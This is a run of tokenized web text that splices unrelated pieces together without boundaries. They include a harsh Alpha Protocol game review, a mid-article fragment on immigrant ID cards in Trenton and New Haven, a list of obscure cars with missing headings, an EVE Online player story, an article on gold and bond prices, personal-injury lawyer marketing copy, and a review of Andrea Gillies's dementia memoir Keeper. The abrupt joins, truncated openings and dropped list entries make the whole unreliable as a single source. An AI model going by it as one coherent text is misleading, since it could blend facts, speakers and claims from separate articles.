Alpha Protocol ( PC , PlayStation 3 , Xbox 360 [ reviewed ] )
Developer : Obsidian Entertainment
Publisher : Sega
Released : June 1
MSRP : $ 59.99
If you want to save time , let 's get this out in the open right now -- Alpha Protocol is n't very good .
In fact , it 's absolutely dreadful and it should not have been released in the state it 's in .
It looks and feels every bit like a game that has been subjected to patches , fixes and panicked over - development , yet still managed to hit its ( perpetually postponed ) deadline without being finished .
Alpha Protocol is a mess , and that 's putting it kindly .
The game is split fairly evenly between token RPG efforts and third - person action , although it 's clear that this is far more of an action game than it is a roleplaying one .
As Agent Mike Thorton , you join the ranks of the Alpha Protocol , a clichéd clandestine organization that specializes in deniable ops .
The game is designed for multiple playthroughs , as the story can change with every choice you make .
In this regard , Obsidian has certainly done something right .
How you speak to characters , who you choose to kill , and how you perform your missions can all have an effect on the game , and for once they 're effects that you can actually feel throughout the course of the game , with long - standing repercussions for your decisions .
Alpha Protocol is innovative in that you never quite know how your words and actions will alter the situation , and unlike other games , where the conversations can be influenced with charisma stats , the interactions of this particular title are determined entirely by whether you choose to be aggressive , professional , or humorous .
Intuitively getting a feel for the situation and the temperament of NPCs takes precedence over shallow and meaningless dialog choices perpetuated by other RPGs .
In the background , Alpha Protocol is still taking you through formulaic and preordained conversations , but the illusion of a natural choice and flowing conversation is crafted surprisingly well .
In terms of the way a story is told , Alpha Protocol is a success .
However , Alpha Protocol 's story never gets very interesting , rendering all the clever narrative tricks rather worthless .
The characters are n't compelling in the least , the narrative is convoluted and feels completely alienated from the overall experience , and Agent Thorton himself is a rather dull character who does n't seem to change all that much regardless of your dialog choices .
Frankly , he comes across as a moronic dick no matter how you " choose " to play him .
Great news for moronic dicks everywhere , but bad news for anybody else .
With a narrative and characters that have all the dimensions of a sheet of paper , the game really needs to rely on its thrilling spy action to remain interesting .
That reliance is soon revealed to be a terrible , terrible mistake .
It 's difficult to describe just how bad the game is , because it's one of those things so unbelievably abominable that one has to experience it for oneself .
However , since playing this game is not recommended , I 'll certainly try and evoke the putridity of the gameplay in text .
First of all , enemy AI is an astonishing shambles , almost to the point of being impressive .
Opponents run around with seemingly no direction whatsoever , apart from the ones who will charge directly into your bullets because they want to punch you in the face .
No joke , one in three enemies want to do nothing but punch you in the face .
He wo n't fire his gun , he 'll just sprint towards you , dodging from left to right like a headless chicken , then he 'll punch you in the face -- once -- and slowly back away , shooting you .
It makes absolutely no sense , and yet it seems to have been deliberately programmed into the game 's AI because that 's all the enemy soldiers ever want to do .
That is , when they 're not conjuring up endless grenades to spam with alarming regularity .
There is a cover system , but it does n't work .
Most of the time the enemies will just shoot through the cover and kill you , and it's also impossible to tell what works as cover and what does n't .
Some surfaces can't be hidden behind , but you wo n't know until you try , soaking up extra damage in the process .
Once you do find cover , you then have to hope Thorton will actually stick to it , and later you 'll hope that he unsticks when you want to move on .
It 's very much a " touch and go " situation as to whether or not Thorton will behave the way you want him to .
In other words , Thorton will decide when he wants to pretend he's in a competent third - person - shooter , not you .
The game is supposedly able to be played one of three ways -- using stealth , using brute force , and using gadgets .
Stealth is no good because the enemy AI is so unpredictable and spotty , not to mention the useless camera and poor graphics make spotting enemies ahead of time difficult , and the complete lack of hiding places negates the idea of sneaking around .
The gadgets are a cool idea , but nothing too innovative , and playing strictly as a gadget - based character mostly means throwing grenades around .
That leaves you with a combat - oriented character , but combat is so crap that it 's not really very fun .
It seems as if Obsidian tried to mix RPG combat with real - time shooting action , and it does n't really work ( what a surprise ! ) .
All it means is that sometimes the guns will miss even if the reticule is dead on target .
You can stay still and watch the reticule close in an enemy for a critical shot , but the opponents are running around like the aforementioned decapitated poultry , so good luck with that .
Steadying one 's aim is next to impossible with the insane characters who are either running towards you , running in circles , or running nowhere , with Thorton stuck in the middle of this chimp 's tea party surrounded by grenade spam and broken cover systems .
A big deal is made of the close quarters combat , but I do n't know why because it 's terrible .
It consists simply of mashing one button and hoping for the best , especially as there 's no targeting system for melee attacks and Thorton will frequently just punch the air in front of an enemy 's face while they shoot the crap out of him .
Unfortunately , it 's almost essential to keep upgrading Thorton 's melee skills because of those enemies who are obsessed with punching him .
When not dealing with a ruined combat system , players can have the action completely broken up by an overabundance of lockpicking and hacking minigames .
You 'll be pleased to know that they are the worst lockpicking and hacking minigames ever developed .
The lockpicking , for example , forces players to gently squeeze one trigger / shoulder button to put a very tiny lock in place , then push the other trigger to set it .
They need to do this multiple times with an absurdly strict time limit in place and it is twice as frustrating as it sounds .
Sometimes the locks wo n't work , either , meaning you have to cancel out of the minigame and get back into it to reset things .
At first the lockpicking is not so bad , but as the game goes on , you have more locks and less time on the clock .
Hacking is very much the same situation .
Too much to do , and not enough time to do it in .
Code cracking involves a grid full of rapidly changing symbols , except for two codes hidden within that remain the same , almost like a wordsearch .
Players have to move two code overlays across the grid , but if they 're too slow , the codes move elsewhere on the grid and need to be found again .
Not only that , but the overlays move across the grid so slowly that even if you find the codes in time , there 's no guarantee you 'll get the overlay in place before it moves .
All of this must be done before an overall time limit runs out .
As with lockpicking , this already convoluted system becomes stricter and more difficult as time goes on , to the point where most sane players will give up entirely and ignore all hacking .
As if that was n't enough , there 's another form of hacking , mostly used for door locks and alarms .
In this system , players must match corresponding numbers by following a short maze between the two figures .
The maze paths can intertwine meaning that quick eyes and swift action are required .
Out of all the minigames , this one is n't half bad , but do n't worry , they find a way to screw it all up .
Basically , the game thinks it 's frightfully clever to increase the amount of numbers that need matching without adequately increasing the time limit .
As soon as you see an alarm with ten numbers that need matching , just forget it , because it 's not doable .
The time limit is simply too short and the controls are too slugging and slow to deal with it .
Not only that , but you can't rush the game because any mismatched number will shorten the already too short time limit .
In fairness , there are stats you can level up to make these minigames less abysmal and easier to d eal with , but Alpha Protocol masquerades as a game about choice , and if you choose not to max these stats out , you will basically be screwed over later on .
You 're never warned just how abundant these minigames are , with a new lock to pick or computer to hack appearing literally every five minutes , usually in clusters .
Basically , if you want to enjoy Alpha Protocol at all , you need to max those stats or face hours upon hours of locked doors and untouchable computers that will reward your efforts with nothing but misery and rage .
Choice is an illusion .
Alpha Protocol 's RPG elements are n't half as bad as the combat and general gameplay .
Thorton can be customized in a number of cool ways , from his personal history to his various skills and proficiencies .
Gaining skills in different guns wo n't just increase his damage with them , but they will confer unique special abilities , accuracy upgrades , and critical hit chances .
Thorton 's actions during the game will also result in special perks that will stick with him throughout the game .
Damage bonuses , health upgrades and more can all be won simply by talking to somebody in a certain way , or choosing to spare and end different lives .
If Alpha Protocol has managed to do one thing in a new and impressive way , it 's weaving an RPG experience throughout an action game , rather than keeping the two elements completely distinct from one another .
It 's just a shame that such clever and thoughtful development is wasted in this complete travesty of a videogame .
As with any good RPG , there are all sorts of special skills and buffs that can be unlocked while leveling up Thorton .
It 's a shame that very few of them are actually useful , though .
Generally , you 'll find one or maybe two special skills and stick with them , especially since selecting gadgets and skills requires pausing the game to bring up a radial menu in order to select what you want and then going back into the game and pressing a different button to use it .
Most games , better games , just let you automatically activate a skill from the radial menu itself , but Alpha Protocol is n't a good game , so you have this pointless little process to go through instead .
Speaking of pointless processes , the mission selection is a complete pain in the backside .
After every mission , Thorton has to go back to his safehouse and engage in rambling conversations before he can do anything .
There are all kinds of time wasting activities , such as reading emails and buying weapons , but all these actions are accessed via pointless wandering from one destination to the next .
Running upstairs to your computer to read vapid emails from dicks in between every mission just is n't fun .
But then , nothing else about Alpha Protocol is fun so at least it 's keeping with the theme .
The game 's graphical presentation does a good job of matching the atrocious quality of the gameplay , with textures that frequently pop in and out , all manner of visual glitches such as floating objects or unresponsive targeting , and just good old fashioned bad animations and sub - par effects typifying the game 's commitment to being bad .
This is all topped off with mediocre voice acting , mediocre sound effects , and mediocre music .
Essentially , Alpha Protocol looks exactly how it plays -- like a bad budget game that is n't even worth $ 20 , let alone the $ 59.99 asking price .
Generally speaking , writing a bad review is never fun , and only a sadist would derive pleasure from crucifying a videogame in public .
However , when a game comes out that 's so bad only the willfully ignorant could deny its awfulness , harsh and cruel criticism is thoroughly deserved .
Because there 's no excuse for pap like this .
There 's no justifiable reason you could have for essentially conning people out of their hard earned money for a game so badly cobbled together .
There are games in their beta stage that are more complete , better designed , and more worth paying for than this mistake .
It 's disgusting that a game in this forsaken a state is asking for a single thin dime , let alone sixty bucks .
Even if it was free I would n't recommend it .
Alpha Protocol , to its slim credit , has its basis in noble and ambitious ideas , and those ideas are even well executed on the whole .
However , while the ambitious stuff hits the mark , the bog standard gameplay has suffered beyond measure .
You can build the most magnificent castle in the world , but if the foundations are made out of wet feces , everything 's going to crumble and fall apart before your very eyes .
Alpha Protocol is a castle that 's collapsed in crap .
Proof that even the most accomplished of visions are worthless if the fundamentals are n't in place .
Obsidian and Sega , like the US government portrayed in this very game , are better off denying all involvement in this failed operation .
2.0 -- Bad ( 2s are a disaster .
Any good they might have had are quickly swallowed up by glitches , poor design choices or a plethora of other issues .
The desperate or the gullible may find a glimmer of fun hidden somewhere in the pit . )

He added , “ It encourages people to stay in those communities , when in fact the policies ought to be discouraging those people . ”
But Ms. Juega said she and her fellow advocates in Trenton were motivated by a desire to “ allow this population that is increasingly marginalized to have some semblance of a normal life . ”
About 23 percent of Trenton ’s 83,000 residents are immigrants , mostly Latinos , according to the 2008 American Community Survey .
Many do not have legal immigration documents , advocates say .
Trenton ’s ID program , which began in May 2009 , met with minimal resistance among city officials , said Detective Bob Russo of the Office of Community Affairs in the Trenton Police Department , who has been a major proponent .
“ I ’ve had a few colleagues who were against it , ” he said .
“ But we stressed that you ’re not giving this person any pass or anything like that , you ’re just accepting that person as a member of the community . ”
City and police officials are under orders not to ask residents about their immigration status , unless it is in connection with a felony .
Still , only about 1,300 people in Trenton have stepped forward to get the cards .
Some immigrants have been wary , despite promises that the information they provided would remain confidential .
Two days after New Haven lawmakers approved the nation ’s first plan to offer cards in 2007 , federal agents from Immigration and Customs Enforcement began a series of arrests in the area that sent 32 immigrants to detention centers around New England — a move that the mayor , John DeStefano Jr. , described as retaliation .
By the time city officials issued the first IDs , called Elm City Resident Cards , many residents were afraid to come forward .
Some other communities waited to see if there were legal challenges to the New Haven program , but none surfaced .
Opponents of the program filed an open records request seeking the participants ’ names and addresses .
The city ’s refusal was upheld by the Connecticut Freedom of Information Commission , said Michael J. Wishnie , a Yale law professor who helped develop the program and was retained by the city to help defend it in the event of lawsuits .

10 . 1967 Mohs Ostentatienne Opera Sedan
Suggested By : Austin Mini Man
What Makes it Awesome : The Ostentienne Opera Sedan was accessible only from its one rear door and sported solid steel rails for crash protection .
Ostentatious does n't begin to describe options like gold - inlaid panels , refrigerators , and Ming - style oriental rugs .

What Makes it Obscure :
At an inflation - adjusted purchase price of over $ 160,000 for a truck - engined car that looked like the unholy offspring of a 1927 Rolls Royce Playboy Roadster and a Facel Vega .
Buyers were scarce , with only three or four examples seeing production each year over the car 's short run .

9. 1951 -1954 Muntz Jet
Suggested By : MZS
What Makes it Awesome :
With an attractive aluminum body , a fiberglass top , and American V - 8 power , the Muntz offered both performance and style at or above par for its era .

What Makes it Obscure : Producing such an advanced car cost money , and in the case of the Muntz Jet , the cost was greater than the selling price .
Production ceased after around 400 examples .

8. 1985-1990 Owosso Pulse
Suggested By : Dolphfr
What Makes it Awesome : Once used in an advertisement for Coors beer , the Owosso Pulse looks like a jet but is actually powered by a Yamaha or Honda motorcycle engine .
The Owosso's creator , a kitplane designer named Jim Bede , considered it a to be a roadgoing version of his airplane designs .

What Makes it Obscure : Despite being remarkably thrifty with fuel , the Pulse saw limited production .
Current estimates put about 150 left on the road .

What Makes it Awesome :
It 's the Volvo even Volvo enthusiasts forget about .
A quirky and half - hearted Swedish attempt to build a Corvette , the P1900 lacked the power and style of the American sports car .

What Makes it Obscure : Quality was n't up to normal Volvo standards ; according to lore , when the head of the company drove it , he was so scared that he immediately stopped production .
Only 68 were produced , and many did n't survive .
( Sam Smith once drove one on a Volvo press trip .
His thoughts : " It 's like a 444/544 that someone beat with a horrible stick . " )

5. 1963 ATS 2500 GT 3.0 - Liter Coupe
Suggested By : Zagto
What Makes it Awesome :
The ATS 2500 GT is so romantically shaped you 'd swear it was a Ferrari .
You would n't be far off .
The ATS was the work of a handful of former Ferrari employees ; motivated by a 220 - hp , mid-mounted 2.5 - liter V - 8 , it was able to hit 150 MPH .

What Makes it Obscure : Like most of the companies on this list , ATS was eventually torpedoed by financial trouble .
Less than ten cars were built , and just one had a full interior .

4. 1984 -87 Honda CRX Roadster
Suggested By : SlimWhitman
What Makes it Awesome : The Honda CRX is one of the most desirable 1980s econohatches and was ubiquitous when new .
A coachbuilt convertible just ups the excellence .

What Makes it Obscure : The CRX was converted into a roadster by the Straman Company and could be ordered from a Honda dealership for about $ 5,000 .
It 's hard to believe that 130 people forked over money for a less - usable Honda , but we 're glad they did .

3. 1971 Manic GT
Suggested By : Franchitti27
What Makes it Awesome : It 's Canadian .
It 's called " Manic . "
It 's the cheaper , less attractive , Renault - based stand - in for the Alpine .
Advertisement
What Makes it Obscure : Designed by a guy named Jacques About ( no kidding ) , the Manic GT was going to be the first big Canadian sports car .
A crappy Renault - based supply chain meant the plant never had enough parts to continuously build cars .
Just 160 Manic
GTs were produced .

2. 1956 Powell Sport Wagon
Suggested By : Jonee
What Makes it Awesome : This 1941 Plymouth - based wagon was the proto - crossover / SUV and constructed from rebuilt parts from other cars .
It had few curves because curves were expensive .
The best feature is the long tubes in the rear — they were designed to hold fishing lines or other long objects .
Advertisement
What Makes it Obscure : Because the cars were built from old Plymouth parts Powell was limited by component supply .
The Powell Registry shows few were produced ; even fewer Sport Wagons remain .

What Makes it Awesome :
It 's an English car designed by Giugraro , built by Bertone , and fitted with the 5.4 - liter V - 8 from a Corvette .
It looks as sexy as any European GT from the day ( in profile , at least ) and was just as fast .
It also had a turtle for a logo , which is kind of awesome .

What Makes it Obscure : The Gordon - Keeble had a lot going for it , but a too - high price and supplier issues doomed the car to just 100 examples .
You may never have heard of it , but now that you 've seen it , you probably wo n't forget it .

Hello all , I 'm pretty new to EVE ( ~1 month ) but I 've come to visit this site pretty regularly since discovering it .
I pretty much owe my PvP bloodthirst to you guys !
Now , I 'm not a pirate - actually my corp is rather anti-pirate & bounty hunters ( among that , targeting pirates with bounties ) - so keep this in mind as I tell you the story of my first kill as a pirate hunter .
As you 'll see , it involves desperation , subterfuge , and liberal cajoling .
Enjoy .
I 'm hanging out in my local .4 , looking for trouble .
I have a few safespots set up , and I 've been shuttling between them in my blackbird for an hour or so , scanning the belts for likely targets while keeping an eye on local .
The crowd is all positive or 0 sec status , so my pickings seem pretty slim as far as bad guys to fight .
I decide to head to a station to dock and call it a day , so I warp on over .
Cleared for publication by : Ander
Rest of story moved to extended body .
roadrage639 > hi
happyapples > do n't shoot me
happyapples > i'm not set up for fighting you 'd kill me
roadrage639 > i no
roadrage639 > pay me and i wont
happyapples >
i do n't have any money
roadrage639 > tough
happyapples > please do n't blow up my ship i do n't have any shield stuff on it
roadrage639 > 1 mill or die
As my ship drops out of warp , I notice a lone merlin sitting in space .
I neglect to approach the station to dock , as I 'm busy getting info on the pilot to see who he is .
As I 'm doing this , I notice him start moving ... whoa , that 's weird , he 's approaching my ship .
On a lark , I lock him for fun , maybe half hoping he 'd panic and fire on me and provide me with sentry gun entertainment .
Unsurprisingly , he locks right back as he starts orbiting my ship .
At this point I know that he's an 8 - day old character still in the learning corp .
" Hmm , " I wonder , " he know about the sentry guns or does n't he ...? "
Now , being the mean old coot that I am , I attempt to bait him in local :
And then ...!
What does he respond with ?
Okay ... so either he bought my spiel and is looking to make some money off of it , or he 's betting thatdo n't know about the two nice sentry guns sitting by the station .
We both bullshit each other some more :
This goes on for a while , getting pretty ridiculous , with the lies on both sides piling up fast .
After an eternity ( probably only 5 - 6 minutes ) of waiting for him to blow up my ship , I decide that it 's not happening and he is wise to the sentries .
I give up and proceed to warp to a random belt , figuring on hanging out a bit more in system before logging off .
A gang invitation pops up on my screen !
Can it be true ?
Can it be so easy ?
What on earth is he thinking ?
My erstwhile bullshitter has invited me to his gang !
With much glee , I accept his invitation .
Of course he warps to me right away .
I waste no time .
We both lock each other at the same instant , but his lock dissolves immediately to my twin jammers .
Within seconds his ship and weapons systems are bound , gagged and helpless .
I unleash EMP hell .
Some NPC Guristas show up to join the party .
Meanwhile , my gangmate is trying to get me to ransom him .
It tempts me for half a second , but I realize that 1 .
I 'm not a pirate , I 'm an anti-pirate , so on principle I can't accept , and 2 .
He 's bullshitting again anyway .
No way would anyone pay to save a merlin .
As the final salvo of heavy missiles hits and his merlin explodes into a fine mist , I muse to myself that he and I are not really that different .
Each an opportunist , each glibly fibbing to further our own ends .
The only reason I prevailed was that for some reason , my opponent decided that his merlin could outshoot my blackbird .
Am I really , then , so much of a better space citizen than him merely because he assumed the role of " pirate ransommer " first ?
And would he even have done so if I had not baited him ?
Clearly , this particular pirate kill walks on that thin line between killing pirates and killing for sport .
I tell myself that in the future , I will stay out of such gray areas and not be such a temptation for noobs to do space - evil .
I do n't try to lock his pod , and watch it warp away .
“ ALICE laughed : ‘ There 's no use trying , ' she said ; ‘ one ca n't believe impossible things . '
‘ I daresay you have n't had much practice , ' said the Queen .
‘ When I was your age , I always did it for half an hour a day .
Why , sometimes I 've believed as many as six impossible things before breakfast . ' ”
Occasionally investors can believe impossible things , as they did when dotcom stocks with no profits were valued at more than flourishing multinationals .
But they can also believe in incompatible things , which is even more striking .
Take the recent surge in the gold price to a nominal record of $ 1,251.20 an ounce .
Owning gold is traditionally seen as offering protection against inflation .
And inflation is very bad news for owners of government bonds .
But the ten - year Treasury bond yields just 3.3 % , a level that is towards the low end of the historical range .
There is something remarkable about this combination .
You would expect the performance of gold and Treasury bonds to be inversely correlated .
When gold was at its real all - time high in 1980 , the ten - year Treasury - bond yield was 10.8 % .
Fixed - income investors had suffered years of negative real returns in the 1970s .
Adding other assets to the mix does not solve the dilemma .
David Ranson of Wainwright Economics , a consultancy , has examined how gold and corporate - bond spreads have worked as a guide to asset allocation since 1978 .
The gold price is an indicator of inflationary pressures .
Bond spreads are an indicator of growth : investors are happy to take the risk of owning corporate bonds , and spreads come down , when the economy , and thus business revenues , are strengthening .
Over the year to end - May gold was up by 25 % while corporate - bond spreads narrowed sharply .
History suggests that such a combination should be bad news for government bonds .
So what explains the current situation ?
Both gold and Treasury bonds could be classed as “ safe haven ” assets that investors buy when they are risk - averse .
But if not inflation , safe havens against what ?
Investors did buy gold in 2007 and 2008 when they were worried about the health of the banking system .
Some thought that physical gold would be a lot safer than a deposit in an insolvent bank .
In recent weeks there has been a rise in both LIBOR ( a gauge of banks ' borrowing costs ) and the credit - default - swap spreads on bank bonds ( the cost of insuring against default risk ) .
But in neither case are things as bad as they were in the autumn of 2008 , when Lehman fell and no bank seemed safe .
Gold was only around $ 900 an ounce during that burst of risk aversion .
Of course , safety is relative .
The finances of Germany and America look better than those of Greece or Spain .
Some say banks have been demanding German bonds as collateral for financing and refusing to accept the bonds of other euro - zone countries .
This could be holding down the yields of the most liquid markets .
But that raises a related point that investors seem to be overlooking .
Many people argue that Britain and America , for example , are in a better position than euro - zone members like Greece because they can depreciate their currencies .
That may be good news for the governments concerned but it is bad news for investors .
It does not take much depreciation to wipe out an annual yield of 3 - 4 % a year .
For hedge funds and other investors which will not be holding bonds to maturity , currency movements may determine their return .
They ought to demand extra yield as compensation for the risk .
Then again , private investors may not be setting the price .
Government - bond yields are being held artificially low by central - bank actions .
In some cases ( the European Central Bank or the Bank of England ) this is because of direct purchases of bonds .
In others it may be because central banks have rigged the yield curve , holding short - term rates artificially low and inducing banks to make money by buying longer - dated government bonds .
A third factor is that Asian central banks are big buyers of Treasury bonds as part of their exchange - rate management policies , and are relatively indifferent to future returns .
Perhaps the explanation is simpler .
Martin Barnes of Bank Credit Analyst , a research firm , points out that the direction of official policy ( low rates , quantitative easing , big deficits ) looks inflationary but the economic fundamentals ( a big output gap , sluggish credit growth ) look deflationary .
Faced with this dichotomy , investors who buy both Treasury bonds and gold are not displaying cognitive dissonance .
They are just hedging their bets .

What Questions Should You Ask A Personal Injury Lawyer in Anderson ?
There are a lot of personal injury attorneys in the city of Anderson , which makes it difficult to know which one is right for you .
The key to finding the best attorney for your case is asking questions .
Make sure you ask about an attorney ’s personal injury experience prior to hiring them .
You need to find an attorney who has experience with personal injury cases that are similar to yours .
For example , if you are a medical malpractice victim , you should n’t hire an attorney who specializes in traffic accidents .
You should also look for a personal injury attorney who has trial experience .
Most cases are settled outside of the courtroom , but your attorney should be prepared to go to trial if that ’s what is necessary to secure compensation .
Take advantage of free consultations to ask these questions so you can narrow down your options and choose the right attorney for you .

Waking up each morning , when you have Alzheimer 's , is like a scene from an amnesiac horror movie , Andrea Gillies suggests in her powerful and disturbing account of two years spent caring for her mother - in - law , Nancy , in the grip of galloping dementia .
Nancy wakes " to find that she has aged 50 years overnight , that her parents have disappeared , that she does n't know the woman in the mirror , nor the people who claim to be her husband and children , and has never seen the series of rooms and furnishings that everyone around her claims insistently is her home , " Gillies writes in Keeper .
The transition from sanity to Alzheimer 's - induced oblivion is like stepping through Alice 's looking glass , Gillies explains , and the most distressing period is when you are moving from one side to the other .
" She had one foot through the looking glass and she could n't make those two worlds – dementia reality , and normal life – gel at all , " Gillies says .
" It was really quite science fiction in a way .
Complete strangers coming into the house and saying ' How are you today ?
Shall we go and have a walk ? '
Obviously your reaction is going to be ' What are you talking about ?
I 've no idea who you are . '
She would awake in the morning not knowing who the man in the next bed was and she was afraid .
Strangers would come into her bedroom and hand her clothes she had never seen before . "
The raw horror of Alzheimer 's is laid out by Gillies in this sharp examination of the comprehensive disintegration of her mother - in - law 's brain and sense of self .
" If I had to pick one catch - all descriptor for Nancy 's life in the last few years it would be misery .
Profound misery , unceasing and insoluble .
She knows that something is wrong , very wrong , but what is it ? " she writes .
" Every day for her is spent in an ongoing quest to put things right . "
But this is not another guide to be added to the depressing pile by the bedside for those who are confronting the decline of a relative .
It is as much an exploration of memory , its loss and the subsequent erosion of personality , as a chronicle of the destructive chaos that the onset of Alzheimer 's unleashes on the extended family .
It is also a chronicle of Gillies ' own unravelling , as the exhausting , thankless realities of a carer 's role overwhelm her .
Her book is both scientific and political : a combination reflected in the two prizes it has won in the last six months – the Wellcome prize , in recognition of its dispassionate analysis of the havoc the disease wreaks on the brain , and the George Orwell prize , registering the author 's anger at a medical and social care system that is failing to support sufferers and their carers .
Somehow , despite the territory , Gillies manages to steer the book away from misery lit and beneath the profoundly bleak narrative runs a stream of grim humour .
Most powerful , however , is Nancy 's own voice , carefully recorded by Gillies in nightly diary entries , a voice that is at times cantankerous , bewildered and defiant .
Reading these monologues , we get very close to understanding what it feels like to experience this illness .
" I do n't understand at all what is going on here , " she says .
" None of it makes sense .
What 's happening here ?
How did I get here ?
What 's happening ?
Please .
Please . "
Gillies and her husband begin with a very clear moral position on caring for the elderly .
Children have a responsibility to look after their parents , she argues .
" First the mothers mother and then the mothers are mothered in turn .
That 's how the world should work .
We can't just abandon our mothers .
We should n't discard the elderly ; we should find ways to cherish them . "
What makes this book so unexpected is the honesty with which Gillies records the catastrophic consequences of this well - intentioned act .
When independent life becomes impossible for Nancy and her husband Morris ( both names changed by the author ) , they move from a flat in Edinburgh to a bungalow near the house in the Scottish highlands where Gillies lives with her husband and children .
But it swiftly becomes clear that they cannot look after themselves in their new home , so Gillies and her husband decide to sell up their own family home and buy a big Victorian house on a remote Scottish peninsula , moving their 10 - old - year son , Jack , and his two teenage sisters into new schools and creating two separate establishments in one home , connected by a communal kitchen .
There is no self - congratulation about the decision , just a detailed account of how this wholesale ripping up of their own lives to accommodate the older generation sets the family on a course that turns out to be disastrous for everyone , with Nancy and Morris eventually being moved into a care home .
Two years later , Gillies ' kind - hearted optimism has dwindled to desperation and she and her husband find they can no longer cope .
Nancy has deteriorated from a benignly forgetful doting grandmother to a raging harpy , who slaps her granddaughters , calls her beloved grandson variously a bastard , arsehole and bitch , cannot remember how to use cutlery , prefers not to wash , tucks used bits of loo paper up her sleeve , squats on the floor to pee and hides her own turds behind paperbacks in the bookshelves ( " the kind of discovery that 's unexpected late at night when you 're looking for something to read " ) .
Most critically , she no longer recognises her husband .
Gillies believes now that their determination to do the right thing by Nancy meant in fact that they did the worst possible thing , moving her away from the home she knew well to three new and unfamiliar environments in the space of just a few years .
" In general , when people become carers , they have no idea what they 're doing .
It 's about obligation and love and duty – old - fashioned ideas , " she says , over lunch in St Andrews , where she has since moved with her family after surrendering care of Nancy to professionals .
" I assumed , rather arrogantly , that a lot of the ill - behaviour associated with dementia – the hostility , the anger , the violence , the unpleasant side – were to do with external factors , because people were n't being looked after well .
We thought , if we took Nancy into our home and exposed her to family love 24/7 , caring grandchildren , that we would be able to somehow cushion her descent .
This was completely misguided . "
The decision to sell up and move to the remote peninsular was , Gillies says now , " whimsical " .
The mortgage was to be partly funded by running the house as a bed and breakfast , a business model that became increasingly unworkable as Nancy 's dementia worsened .
( On one occasion recounted in the book , Nancy surprises Australian guests over breakfast when she marches through the dining room wearing nothing more than a large pair of lilac briefs ; they are too polite to complain . )
" I had n't thought about the practicalities .
I had this rather rosy idea that we would go for walks together on the beach , a three - generational family , that she would be amusingly dotty and that she would benefit from being with the children and this incredible location , " Gillies says .
Now she knows that has more in common with the airbrushed Hollywood version of grandmothers that we wish to see .
Movie grannies with their tea dresses and crochet cardigans " who are pliant and hygienic , who dispense old - world wisdom to the children of the house , and are amusingly direct " have a lot to answer for , she writes .
" Movie grannies do n't refuse point - blank to clean their teeth .
They do n't yell obscenities at their grandchildren , or tell outsiders they 're being kept a prisoner .
They never pull down their trousers and touch their toes and ask you if their bottoms are clean , or get sent home early from the Thursday club for disruption . "
But Gillies was also poorly advised by medical staff .
If anyone were to ask her advice now on how best to care for someone with Alzheimer 's , she would recommend that they continue supporting them in the home where they are already living for as long as possible , before moving them to a care home .
" It would have been better to leave them in their flat as long as possible and then make one move , to some kind of Alzheimer 's unit .
That sounds monstrously selfish – as if I was trying to avoid the caring responsibility , but it would have been much better for Nancy , " she says .
Worse than simply destroying their recollections of the past , the memory loss produced by Alzheimer 's prevents those who have the disease from making new memories .
" She could n't map her new home .
Every morning she woke up thinking she had just arrived and she did n't know where the kettle was or how to get to the bathroom .
This made her angry and afraid , " Gillies says .
Her own role as a carer is scrutinised without sentimentality .
She engages Nancy with gardening projects , cooking activities , encourages her to draw , or help with the cleaning , makes her endless cups of tea , meals , plates of cake , washes her , dresses her , helps her to the loo and encourages her to talk about the past and confront her illness .
Initially , this exhaustive care is met with gratitude , but gradually Nancy turns against her , begins mumbling acerbic criticisms into her hand when she sees her , muttering darkly about the cruel people who make her do all the work and just want to steal her money .
On one occasion she attacks her with the coal shovel .
Gillies charts her own decline into depression , noting how Nancy succeeds " in sucking the optimism out " of her .
The transformation of her mother - in - law 's personality sets Gillies on an investigation into the way the brain controls personality , concluding that identity is biological .
" Selfhood is n't something separate from your biological self , " she writes .
" The brain is where your self is made . "
Doctors prescribed Nancy drugs designed to stay the loss of memory , but it 's not clear that these had much effect .
They experimented with sedatives to calm her anxieties , but these left her restless in the night and more disturbed in the days that followed .
Gillies had to explain to her 10 - year - old son that the woman walking around in his grandmother 's body was " not really your granny any more " but was " someone who has been invaded by this disease " .
" Those are terrible words to have to say .
But that 's the only way to explain why a previously doting granny has started to hit her grandson and call him a bastard . "
The middle to final stages of dementia are the most distressing , as Nancy 's ability to remember her husband flickers .
The anterior cingulate is the part of the brain controlling storage and retrieval of long - term memory , Gillies explains .
" When it is damaged by dementia , its malfunction means that only parts of the long - term memory are accessible , and these bits can't come together in a meaningful way .
Perhaps in terms of emotional impact , it 's worse to have parts than none at all .
If the anterior cingulate 's disabled entirely , the access to the past is completely blocked off .
It is n't in Nancy 's case .
Not yet .
Instead , it fluctuates like bad radio reception , going on and off station . "
When they tell Nancy that the strange man in the bed next to her is her husband , she tells them : " You 're all liars . "
" You 're all mad .
You 're all mistaken .
That is n't Morris .
You think I do n't know who Morris is ?
Well , I do and that is n't him . "
By the time Gillies and her family decide they are no longer able to cope , Nancy " was engaged daily in a very protracted slow - motion form of panic " , a state that was painful for everyone around her , particularly her husband , to witness .
Sensitive to the charge that she is squeezing literary material from family disaster , Gillies makes her position clear in an angry introduction to the book .
Dementia is ill - understood and remains so stigmatised that the government fails to treat it with the same urgency as other illnesses such as cancer , she argues .
Cancer , because it is something that the young and glamorous can suffer from , commands a greater respect as a condition .
Dementia is shabbier , associated with the distasteful process of ageing , something that we would all much rather forget about .
The figures , however , suggest that we should n't forget , and this was part of Gillies ' motivation for writing the book – a project that distracted her from novel - writing .
" There are more than 820,000 people in the UK with dementia , two - thirds of them are women , and the figure is rising sharply , " she writes .
" For UK citizens reaching 65 this year , the risk of developing dementia is one in three . "
Most forcefully , she challenges what she says is a widespread misconception that dementia is a good way to go , a kind state of absentness that blinds the sufferer to the relentless decline towards death .
On the contrary , dementia takes away everything , she concludes , " every last thing we reassure ourselves that nothing could take away from us . "
Nancy 's disease has progressed to a kinder stage , where her forgetfulness is soothingly comprehensive .
Her husband is now dead , and she is untroubled by his absence .
The family visit quarterly , to reassure themselves that she is being properly cared for , but their visits have no impact on Nancy , who accepts the flowers and chocolates , but has no recollection of ever having met them before .
" People find it hard to grasp that we do n't see her more often , they see it as neglect .
But it makes literally no difference to her , " Gillies says .
She still occasionally feels guilty at having abandoned the attempt to care for Nancy , even though she is clear that it was the best solution .
" For the six months before she went to the care home I think she was very unhappy because she was trying to grapple with who we all were .
She half - recognised the situation and that was frightening , " she says .
Now Nancy is no longer struggling " because she no longer has the remnants of her past to grapple with .
It 's all gone .
All gone .
All understanding of her life , all autobiography gone .
To use the looking glass metaphor , she is a much happier person now because she is completely through to the other side of the looking glass .
She lives in dementia reality and has no connection with the normal world . "

I received an email - based interview request on climate a while back from Esquire Middle East .
